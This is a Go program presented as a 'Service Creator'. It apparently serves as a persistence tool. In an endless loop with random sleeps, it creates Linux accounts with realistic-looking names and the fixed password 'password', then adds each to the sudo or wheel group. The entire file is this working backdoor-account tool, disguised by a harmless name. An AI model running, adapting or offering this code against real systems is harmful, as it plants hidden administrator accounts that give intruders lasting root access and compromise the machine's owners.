package main

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var users []string
var password string
var currentOS string
var isDemo bool
var numUsers int
var isVerbose bool

func main() {
	args := os.Args
	currentOS = getOS()
	buildUsers()
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			if args[i] == "--demo" {
				isDemo = true
			} else if args[i] == "-n" {
				numUsers, _ = strconv.Atoi(args[i+1])
			} else if args[i] == "--help" || args[i] == "-h" {
				fmt.Println("Service Creator\n\n" +
					"--demo		|	Displays users but does not create them\n" +
					"-n [num]	|	Generate n users (default: 1)\n" +
					"--help or -h	|	Display this help menu",
				)
				return
			} else if args[i] == "-v" {
				isVerbose = true
			}
		}
	}
	do()

}

func do() {
	osPath := os.Getenv("PATH")
	if strings.Index(osPath, "/sbin") == -1 {
		os.Setenv("PATH", osPath+":/sbin:/usr/sbin")
	}
	fmt.Printf("Creating user\n")
	for i := 0; i < numUsers; i++ {
		index := random(len(users) - 1)
		username := users[index]
		username = username + strconv.Itoa(random(99)) + strconv.Itoa(random(99))
		fmt.Println(username)
		if !isDemo {
			createUser(username)
			addSudo(username)
		}
	}
	rand.Seed(time.Now().UnixNano())
	delay := (random(19) + 1) * 60
	fmt.Printf("Sleeping for %d Minutes\n", delay/60)
	time.Sleep(time.Duration(delay) * time.Second)
	do()
}

func getOS() string {
	var ret_os string
	os_str := readFile("/etc/os-release")
	os_split := strings.Split(os_str, "\n")
	for i := 0; i < len(os_split); i++ {
		if strings.Index(os_split[i], "ID=") != -1 {
			ret_os = strings.Replace(os_split[i], "ID=", "", 1)
			ret_os = strings.Replace(ret_os, `"`, "", -1)
			break
		}
	}
	return ret_os
}

func addSudo(username string) {
	group := "sudo"
	if currentOS == "centos" {
		group = "wheel"
	}
	cmd := exec.Command("usermod", "-aG", group, username)
	//cmd.Run()
	b, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
	}
	if isVerbose {
		fmt.Printf("%s\n", b)
	}
}

func createUser(username string) {
	cmd := exec.Command("openssl", "passwd", "-1", password)
	passwordBytes, err := cmd.CombinedOutput()
	if err != nil {
		panic(err)
	}
	// remove whitespace (possibly a trailing newline)
	passwd := strings.TrimSpace(string(passwordBytes))
	cmd = exec.Command("useradd", "-p", passwd, username)
	b, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf("%s\n", b)
}

func readFile(path string) string {
	dat, _ := ioutil.ReadFile(path)
	str := string(dat)
	return str
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func buildUsers() {
	numUsers = 1
	password = "password"
	users = []string{
		"Martin",
		"Nina",
		"Reuben",
		"Tamra",
		"Omar",
		"Jessie",
		"Wally",
		"Lora",
		"Bridgette",
		"Rosalind",
		"Jana",
		"Thad",
		"Thaddeus",
		"Andreas",
		"Otis",
		"Ida",
		"Valeria",
		"Lyle",
		"Nellie",
		"Sherri",
		"Bernardo",
		"Vernon",
		"Cornelia",
		"Barbara",
		"Sol",
		"Enrique",
		"Douglas",
		"Cordell",
		"Roberta",
		"Frieda",
		"Freida",
		"Quentin",
		"Hallie",
		"Damien",
		"Lea",
		"Deana",
		"Herman",
		"Emma",
		"Tyler",
		"Nita",
		"Leola",
		"Antione",
		"Horace",
		"Deann",
		"Oscar",
		"Michael",
		"Edwardo",
		"Hope",
		"Sheldon",
		"Rebecca",
	}
}
